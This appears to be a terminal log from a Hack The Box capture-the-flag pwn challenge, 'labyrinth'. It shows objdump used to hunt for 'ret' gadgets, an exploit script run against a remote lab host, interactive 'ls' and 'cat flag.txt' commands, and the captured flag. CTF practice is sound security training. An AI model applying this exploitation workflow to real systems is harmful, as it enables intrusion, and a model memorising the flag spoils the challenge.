+    000001c0  96 92 e2 96  92 e2 96 92  e2 96 92 e2  96 92 e2 96  │····│····│····│····│       
+    000001d0  92 e2 96 92  e2 96 92 e2  96 92 e2 96  92 e2 96 92  │····│····│····│····│       
+    000001e0  e2 96 92 e2  96 92 e2 96  92 e2 96 92  e2 96 92 e2  │····│····│····│····│       
+    000001f0  96 92 e2 96  b2 e2 96 b3  e2 96 b2 e2  96 b3 e2 96  │····│····│····│····│       
+    00000200  b2 e2 96 b3  e2 96 b2 e2  96 b3 e2 96  b2 e2 96 b3  │····│····│····│····│       
+    00000210  e2 96 92 0a                                         │····│
+    00000214
+
+[-] YOU FAILED TO ESCAPE!
+
+
+                \O/
+                 |
+                / \
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒           ▒          ▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
+[*] Got EOF while reading in interactive
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[*] Closed connection to 94.237.120.74 port 53289
+[*] Got EOF while sending in interactive
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && objdump -d labyrinth | grep 'ret'"
+  401016:       c3                      ret
+  401170:       c3                      ret
+  4011a0:       c3                      ret
+  4011e0:       c3                      ret
+  40120a:       c3                      ret
+  401210:       c3                      ret
+  401254:       c3                      ret
+  401324:       c3                      ret
+  40137a:       c3                      ret
+  4013ad:       c3                      ret
+  401404:       c3                      ret
+  401602:       c3                      ret
+  40166c:       c3                      ret
+  401670:       c3                      ret
+  40167c:       c3                      ret
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && python3 ../exploit.py REMOTE"
+[+] Opening connection to 94.237.120.74 on port 53289: Done
+[*] Switching to interactive mode
+ 
+[-] YOU FAILED TO ESCAPE!
+
+
+                \O/
+                 |
+                / \
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒           ▒          ▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
+
+Congratulations on escaping! Here is a sacred spell to help you continue your journey:        
+HTB{3sc4p3_fr0m_4b0v3}
+[*] Got EOF while reading in interactive
+$ ls
+$ cat flag.txt
+[*] Closed connection to 94.237.120.74 port 53289
+[*] Got EOF while sending in interactive
